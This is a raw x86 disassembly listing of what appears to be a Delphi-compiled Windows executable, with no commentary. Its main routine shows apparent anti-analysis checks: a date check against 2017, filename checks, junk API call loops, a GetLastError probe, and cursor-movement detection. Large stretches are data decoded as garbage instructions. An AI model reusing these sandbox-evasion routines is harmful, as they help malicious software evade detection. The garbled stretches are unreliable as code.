add [ esi ] dl
or al ch
call 0x7ab781be
push ss
int3
sub_4783d4
push [ edx + esi * 4 + 0x3 ]
jl r-xdata
je r-xdata
jmp r-xdata
add [ eax ] al
outsd
outsd
outsd
outsd
outsd
mov eax [ 0xbba7699 ]
cdq
call 0x6fb78456
jl r-xdata
jbe r-xdata
cmp al 0x6f
outsd
outsd
outsd
outsd
lodsd [ esi ]
je r-xdata
push ss
jno r-xdata
add esi [ esi - 0x4e ]
or esi [ esi - 0x56 ]
pop es
je r-xdata
xchg ebp eax
mov [ 0x76993974 ] eax
mov edx 0xde16a709
cdq
jbe r-xdata
jpo r-xdata
add edx [ esi ]
push eax
loopne r-xdata
outsd
outsd
outsd
outsd
outsd
outsd
stosd [ edi ]
je r-xdata
cmp esi ebx
[ edi + 0x6f ]
jbe r-xdata
cdq
jbe r-xdata
mov [ 0xffffffff992674b3 ] al
jbe r-xdata
or [ edi - 0x1721ea ] esp
[ edi + 0x6f ]
cdq
les edi [ ecx + 0x377cf0f9 ]
int1
test eax 0x78162774
push ss
add [ eax ] al
outsd
outsd
outsd
outsd
stosb [ edi ]
je r-xdata
aas
cdq
jbe r-xdata
jbe r-xdata
mov cl 0x74
and [ ecx - 0x6a505d8a ] bl
lea esi [ ecx - 0x67 ]
cdq
add [ eax ] al
stosb [ edi ]
push ss
movsd [ edi ] [ esi ]
and al [ eax ]
add [ edi - 0x42420a6c ] dl
test eax 0x6170774
add eax [ eax ]
add [ ebx + edi - 0x11 ] bh
je r-xdata
adc eax 0xfffd8f16
[ edi + 0x6f ]
int3
jpe r-xdata
sub_4786a4
push [ ecx + eax + 0x17 ]
into
add [ es : eax ] al
jl r-xdata
inc edi
sub eax 0x6f6f0000
stosb [ edi ]
je r-xdata
retn 0x159f
push ss
cmp al 0x22
add [ eax ] al
outsd
outsd
jle r-xdata
outsd
outsd
outsd
pop ss
or edi edi
and al [ eax ]
add [ edi + 0x6f ] ch
out 0xfc eax
sub_4786cd
inc esi
mov [ 0xffffffffae7bf0f3 ] al
out 0xff eax
inc [ eax ]
mov bl [ ebx ]
push ss
mov ebx 0xf0000013
jpo r-xdata
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
push ss
sub eax 0x3fcc0000
mov edi 0x2d4716
add [ edi + 0x6f ] ch
stosb [ edi ]
je r-xdata
push ss
cmp al 0x22
add [ eax ] al
outsd
outsd
jle r-xdata
outsd
outsd
outsd
pop ss
or edi edi
and al [ eax ]
add [ edi + 0x6f ] ch
out 0xfc eax
sub_47873a
outsd
outsd
outsd
outsd
push ss
mov [ edx ] fs
add [ eax ] al
outsd
outsd
outsd
outsd
outsd
int3
sub_4790f3
leave
push ss
aad 0x1c
add [ eax ] al
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
int3
sub_479251
push ss
0xf0000022 0xa27a
sbb eax 0xed40000
jpo r-xdata
push ss
mov edx 0x6f00003b
outsd
outsd
outsd
outsd
push ss
xchg esp eax
or eax 0x6f6f0000
outsd
outsd
int3
sub_4792c8
push ss
push es
add [ ss : eax ] al
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
pop ss
out 0x31 al
add [ eax ] al
int3
sub_479a49
or [ eax ] al
add [ edi ] dl
movsd [ edi ] [ esi ]
cmp [ eax ] al
add [ edx + esi * 4 - 0x9 ] dh
je r-xdata
outsd
outsd
pop ss
xor eax 0xaf00003a
add [ edx + 0x188116f7 ] cl
add [ eax ] al
outsd
outsd
xchg edi eax
sti
retn
sub_479a9f
push [ ecx + edi + 0x16 ]
fistp [ eax ]
add [ eax ] al
outsd
cdq
jbe r-xdata
add [ eax + 0x163f7ab3 ] ch
fisttp [ ecx ]
add [ eax ] al
outsd
outsd
outsd
outsd
outsd
push ss
xchg ebp eax
inc ecx
add [ eax ] al
outsd
outsd
outsd
outsd
outsd
inc edi
je r-xdata
xchg ebp eax
inc [ eax ]
mov ebx ebx
jmp r-xdata
push ss
push eax
sbb [ eax ] eax
add [ ebp - 0x2474ff01 ] dl
adc ebp [ eax + 0x2516fb95 ]
adc al [ eax ]
add [ edi - 0x10 ] ch
jpe r-xdata
add [ eax ] al
outsd
adc eax [ eax ]
add [ edx - 0x7e ] dh
pop ss
jb r-xdata
int3
dec edi
add al [ eax ]
add [ edi ] dl
mov ebp 0x7afffff6
aas
sub_479dae
push ss
lodsd [ esi ]
or al [ eax ]
add [ edi + 0x6f ] ch
outsd
outsd
add [ edx + 0xba27613 ] cl
test al 0x16
ja r-xdata
outsd
outsd
outsd
outsd
jbe r-xdata
add [ eax ] al
outsd
outsd
int3
add [ esi + 0x79 ] dh
das
jb r-xdata
pop edi
das
scasd [ edi ]
push ss
mov eax [ 0xffffffffbe000031 ]
les esi [ edx + 0x333316f3 ]
add [ eax ] al
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
push ss
add al 0xfd
sub_479e45
sub eax 0x3c016
add [ edi + 0x72 ] ch
jpe r-xdata
je r-xdata
add al [ eax ]
add [ edi - 0x6a08458c ] ch
inc [ eax ]
jbe r-xdata
fist [ esi ]
xor eax 0x6f000023
je r-xdata
jbe r-xdata
scasd [ edi ]
mov bl 0x7a
aas
out 0x76 eax
sti
outsd
outsd
jpe r-xdata
outsd
sbb [ ecx - 0x59e04d8a ] ebx
jb r-xdata
inc esi
add [ eax ] al
push ss
pop ss
scasd [ edi ]
je r-xdata
neg [ ecx + 0x171db276 ]
enter 0x2c 0x0
cmpsb [ esi ] [ edi ]
jpe r-xdata
push ss
mov eax 0x6f00003b
outsd
outsd
outsd
outsd
outsd
outsd
outsd
int3
sub_479f0d
daa
add [ eax ] al
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
push ss
adc [ 0x6f6f0000 ] ebp
outsd
cmpsb [ esi ] [ edi ]
int3
sub_47a4c0
adc [ edx ] eax
xor eax [ cs : eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
jl r-xdata
xor al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ 0x74696e55 ] al
xor [ ebx - 0x1374aa40 ] ecx
add esp 0xfffffe90
xor eax eax
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x16c ] eax
xor eax eax
push ebp
push j_sub_4038ec#2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x30 ]
push eax
call GetLocalTime
cmp [ ebp - 0x30 ] 0x7e1
jae r-xdata
inc eax
add [ 0x74696e55 ] al
xor [ ebx + 0x47a4e0c0 ] ecx
add [ ecx ] dl
add ch [ esi ]
xor al 0x1
mov [ ebp - 0x18 ] 0x7f1
push 0xff
lea eax [ ebp - 0x14c ]
push eax
push 0x0
call GetModuleFileNameA
cmp [ ebp - 0x14c ] 0x43
jne r-xdata
nop
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
nop
call GetLastError
mov [ rw-data ] eax
nop
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x6
je r-xdata
cmp [ ebp - 0x146 ] 0x46
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a7b4
lea eax [ ebp - 0x16c ]
mov edx [ r-xdata ]
call sub_404f24
lea eax [ ebp - 0x164 ]
mov edx [ r-xdata ]
call sub_404f24
retn
mov [ ebp - 0x18 ] 0x363a
nop
nop
lea eax [ ebp - 0x30 ]
push eax
call GetLocalTime
nop
cmp [ ebp - 0x30 ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
jmp r-xdata
cmp [ ebp - 0x147 ] 0x4c
jne r-xdata
mov [ ebp - 0x18 ] 0x301
nop
nop
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x149 ] 0x53
jne r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x25f5
jne r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
nop
jmp r-xdata
mov [ ebp - 0x18 ] 0x213c
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
mov [ ebp - 0x4 ] 0x1
nop
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x87d2
jne r-xdata
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
nop
nop
nop
nop
mov eax 0x1d5b5d59
call sub_4026dc
mov [ ebp - 0x1c ] eax
nop
nop
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x1
nop
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x20 ] eax
nop
mov eax [ ebp - 0x20 ]
inc eax
mov ecx 0xe3
xor edx edx
div ecx
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x20 ]
mov [ eax ] dl
nop
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x1d5b3d3c
jne r-xdata
nop
nop
mov eax [ ebp - 0x1c ]
call sub_4026fc
nop
nop
nop
mov [ ebp - 0x4 ] 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x8bf3
jne r-xdata
nop
nop
xor eax eax
mov [ ebp - 0x4 ] eax
nop
lea eax [ ebp - 0x14 ]
push eax
call GetCursorPos
nop
nop
nop
push 0x10
call sub_406170
nop
nop
cmp [ ebp - 0x4 ] 0x6
jbe r-xdata
nop
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
nop
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
nop
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
nop
nop
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
nop
nop
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
call sub_475140
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0xc
jbe r-xdata
nop
push 0x0
call sub_4751b4
nop
jmp r-xdata
sub_47a4fc
push ebp
mov ebp esp
add esp 0xfffffe90
xor eax eax
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x16c ] eax
xor eax eax
push ebp
push j_sub_4038ec#2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x30 ]
push eax
call GetLocalTime
cmp [ ebp - 0x30 ] 0x7e1
jae r-xdata
mov [ ebp - 0x18 ] 0x7f1
push 0xff
lea eax [ ebp - 0x14c ]
push eax
push 0x0
call GetModuleFileNameA
cmp [ ebp - 0x14c ] 0x43
jne r-xdata
nop
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
nop
call GetLastError
mov [ rw-data ] eax
nop
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x6
je r-xdata
cmp [ ebp - 0x146 ] 0x46
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a7b4
lea eax [ ebp - 0x16c ]
mov edx [ r-xdata ]
call sub_404f24
lea eax [ ebp - 0x164 ]
mov edx [ r-xdata ]
call sub_404f24
retn
mov [ ebp - 0x18 ] 0x363a
nop
nop
lea eax [ ebp - 0x30 ]
push eax
call GetLocalTime
nop
cmp [ ebp - 0x30 ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
jmp r-xdata
cmp [ ebp - 0x147 ] 0x4c
jne r-xdata
mov [ ebp - 0x18 ] 0x301
nop
nop
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x149 ] 0x53
jne r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x25f5
jne r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
nop
jmp r-xdata
mov [ ebp - 0x18 ] 0x213c
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
mov [ ebp - 0x4 ] 0x1
nop
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x87d2
jne r-xdata
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
nop
nop
nop
nop
mov eax 0x1d5b5d59
call sub_4026dc
mov [ ebp - 0x1c ] eax
nop
nop
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x1
nop
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x20 ] eax
nop
mov eax [ ebp - 0x20 ]
inc eax
mov ecx 0xe3
xor edx edx
div ecx
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x20 ]
mov [ eax ] dl
nop
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x1d5b3d3c
jne r-xdata
nop
nop
mov eax [ ebp - 0x1c ]
call sub_4026fc
nop
nop
nop
mov [ ebp - 0x4 ] 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ExtEscape
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x8bf3
jne r-xdata
nop
nop
xor eax eax
mov [ ebp - 0x4 ] eax
nop
lea eax [ ebp - 0x14 ]
push eax
call GetCursorPos
nop
nop
nop
push 0x10
call sub_406170
nop
nop
cmp [ ebp - 0x4 ] 0x6
jbe r-xdata
nop
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
nop
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
nop
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
nop
nop
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
nop
nop
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
call sub_475140
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0xc
jbe r-xdata
nop
push 0x0
call sub_4751b4
nop
jmp r-xdata
sub_47a7da
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47a801
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a808
retn
sub_47a81c
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038ec
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a842
retn
sub_47a9ca
inc edx
add [ ecx + esi * 8 - 0xebbffbe ] dl
inc edx
add [ ebx + edi * 4 ] bl
inc edx
add ah ch
mov edx 0xf34c0042
inc edx
add ah dl
inc edx
add [ edi + edi * 8 + 0x42 ] dh
add [ eax ] dh
inc [ edx ]
hlt
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax r-xdata
call sub_405db0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a3ac
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45a3c4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a444
call sub_403df8
sub_4010e5
xor eax [ eax ]
hlt
sub_40115f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405708
sub_401169
add [ esp + 0x4 ] 0xfffffff8
jmp sub_40571c
sub_40122c
jmp [ __import_lookup_table_1(user32:CharNextA) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40123c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_401244
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_40124c
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40129c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4012bc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_4012dc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40130c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
QueryPerformanceCounter
jmp [ __import_lookup_table_0(kernel32:QueryPerformanceCounter) ]
sub_401324
jmp [ __import_lookup_table_0(kernel32:GetTickCount) ]
sub_40132c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401350
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401370
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401380
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401388
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ad2
jmp sub_4038ec
sub_401ad9
mov al [ rw-data ]
pop ebp
retn
sub_401bb6
jmp sub_4038ec
sub_401c84
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402298
retn
sub_402284
jmp sub_4038ec
sub_40242a
jmp sub_4038ec
sub_4026c9
jmp sub_4038ec
sub_40278c
call sub_405d64
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405d64
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027e0
mov [ rw-data ] edx
call sub_403ed0
sub_402844
push eax
push edx
push ecx
call sub_405d64
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402838
retn
sub_402860
retn
sub_4028b4
retn
sub_4028b8
push ebx
call sub_405d64
mov ebx [ eax + 0x4 ]
call sub_405d64
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402940
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402950
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402a24
mov edx [ eax + 0x1c ]
call sub_4029dc
retn
sub_402bb8
push ebx
xor ebx ebx
imul edx [ ebx + rw-data ] 0x8088405
inc edx
mov [ ebx + rw-data ] edx
mul edx
mov eax edx
pop ebx
retn
sub_402ca8
mov ecx 0xff
call sub_402cb4
retn
sub_402cd8
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402cf4
jmp sub_402cf4
sub_402cf1
retn
sub_403081
jmp sub_4038ec
sub_4030d4
fninit
fwait
fldcw [ rw-data ]
retn
sub_403124
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403130
push ebx
mov ebx eax
mov eax ebx
call sub_403160
call sub_4026dc
mov edx eax
mov eax ebx
call sub_4031a4
pop ebx
retn
sub_40314c
push ebx
mov ebx eax
mov eax ebx
call sub_4031fc
mov eax ebx
call sub_4026fc
pop ebx
retn
sub_403160
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403188
call sub_403524
test dl dl
jle r-xdata
retn
call sub_40350c
sub_403248
retn
sub_4032d0
jmp sub_4038ec
sub_4032d7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4033e0
mov eax 0x8000ffff
retn
sub_4033e8
retn
sub_4033ec
retn
sub_4033f0
retn
sub_4034e5
jmp sub_403638
sub_4034ea
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_40394c
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_40350c
sub_40350c
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403514
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_403524
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403534
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4035fc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403618
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_4039e5
retn
sub_403b28
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403bb6
jmp sub_403638
sub_403c16
jmp sub_403638
sub_403c30
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403b28
mov [ rw-data ] 0x0
call sub_403bd0
retn
sub_403d69
retn
sub_403ecb
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403ed0
mov [ rw-data ] eax
call sub_403df8
sub_40410c
retn
sub_404148
retn
sub_404156
retn
sub_40416f
retn
sub_404180
retn
sub_404267
retn
sub_404398
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_4043b4#2
jmp sub_4043b4
sub_4043fd
retn
sub_404405
retn
sub_404447
retn
sub_4045a0
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402838
sub_4045b8
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404710
retn
sub_404722
retn
sub_404724
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404918
mov ecx 0x1
jmp sub_404884
sub_404922
retn
sub_404958
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402838
call [ rw-data ]
retn
sub_404a5c
mov ecx 0x1
jmp sub_404970
sub_404a66
retn
sub_404a68
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402838
call [ rw-data ]
retn
sub_404c8e
retn
sub_404c90
push edx
call sub_4026dc
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404918
pop eax
sub_404ca4
push eax
call sub_404a5c
pop eax
call sub_4026fc
retn
sub_404cb4
mov al 0x11
jmp sub_402838
sub_404cdf
retn
sub_404d58
retn
sub_404d6c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404b9c
pop ebp
retn 0x4
j_sub_404970
jmp sub_404970
sub_404d81
retn
sub_404d84
call sub_404f24
retn
sub_404fb0
call sub_404f88
retn
sub_4052f9
jmp sub_4038ec
sub_405464
call sub_405474
retn
sub_40546c
call sub_40549c
retn
sub_4054c8
call sub_4054d8
retn
sub_4054d0
call sub_4054f8
retn
sub_4054d8
push ebx
mov ebx eax
mov eax 0x8
call sub_4026dc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405593
jmp sub_403638
sub_4055b4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405628
jmp sub_4038ec
sub_40562f
pop ecx
pop ebp
retn
sub_4056a8
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_4056b4
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_4056c0
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402838
sub_4056d0
call sub_403130
mov [ eax + 0x4 ] 0x1
retn
sub_405708
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_4059f7
jmp sub_4038ec
sub_4059fe
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405a9b
jmp sub_4038ec
sub_405aa2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405aeb
jmp sub_4038ec
sub_405af2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405bb6
jmp sub_4038ec
sub_405bbd
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405c0e
jmp sub_4038ec
sub_405c15
pop ebp
retn
sub_405cec
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405d0c
push eax
push 0x40
call LocalAlloc
retn
sub_405d18
mov eax 0x10
retn
sub_405da4
mov eax rw-data
call sub_4055b4
retn
sub_405e19
jmp sub_4038ec
sub_405e20
pop ebp
retn
sub_405e24
sub [ rw-data ] 0x1
retn
sub_405e2c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405e48
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405e91
jmp sub_4038ec
sub_405e98
pop ebp
retn
sub_405e9c
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FileTimeToDosDateTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToDosDateTime) ]
FileTimeToLocalFileTime
jmp [ FileTimeToLocalFileTime@IAT ]
FindClose
jmp [ __import_lookup_table_6(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_6(kernel32:FindFirstFileA) ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetFileAttributesA
jmp [ __import_lookup_table_6(kernel32:GetFileAttributesA) ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
